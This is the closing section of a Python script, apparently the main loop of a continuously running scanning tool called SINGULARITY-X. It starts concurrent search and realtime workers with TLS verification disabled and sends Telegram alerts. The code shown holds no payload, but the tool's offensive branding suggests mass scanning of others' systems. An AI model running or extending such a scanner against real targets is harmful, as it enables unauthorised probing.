    logger.info(f"[📊] Final Stats: {stats}")
    logger.info("[✓] Shutdown complete")
    sys.exit(0)

async def main():
    """Main 24/7 operation loop"""
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   💀 SINGULARITY-X ULTIMATE v4.0 - 24/7 EDITION 💀       ║
    ║                                                           ║
    ║   🔄 Continuous Operation    🏥 Self-Healing             ║
    ║   📊 Health Monitoring       🔔 Live Notifications       ║
    ║   ⚡ Auto-Recovery           💾 Persistent Storage       ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    logger.info("[🚀] Initializing 24/7 scanner...")
    
    # Setup signal handlers
    for sig in [signal.SIGINT, signal.SIGTERM]:
        asyncio.get_event_loop().add_signal_handler(
            sig, lambda s=sig: asyncio.create_task(shutdown(signal.Signals(s).name))
        )
    
    # Initialize database
    await db.initialize()
    
    # Initialize Telegram
    telegram_ok = await notifier.initialize()
    if telegram_ok:
        await notifier.send_stats()
    
    # Create HTTP session
    connector = aiohttp.TCPConnector(
        limit=SCAN_CFG.MAX_CONCURRENT,
        limit_per_host=100,
        ttl_dns_cache=300,
        use_dns_cache=True,
        ssl=False
    )
    
    timeout = aiohttp.ClientTimeout(total=300, connect=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        logger.info("[⚡] Starting 24/7 scanning modules...")
        
        # Start all workers
        tasks = [
            # Multiple realtime workers
            asyncio.create_task(realtime_worker(session, 1)),
            asyncio.create_task(realtime_worker(session, 2)),
            
            # Multiple search workers
            asyncio.create_task(search_worker(session, 1)),
            asyncio.create_task(search_worker(session, 2)),
            asyncio.create_task(search_worker(session, 3)),
            
            # Monitoring
            asyncio.create_task(health_monitor()),
            asyncio.create_task(stats_reporter()),
        ]
        
        logger.info("[✓] All workers started - 24/7 scanning ACTIVE")
        
        if telegram_ok:
            await notifier.queue_message("🚀 **SINGULARITY-X 24/7 STARTED**\n\nScanner is now running continuously.")
        
        # Run forever
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[💀] Interrupted by user")
    except Exception as e:
        logger.critical(f"[✗] Fatal error: {e}", exc_info=True)
        sys.exit(1)
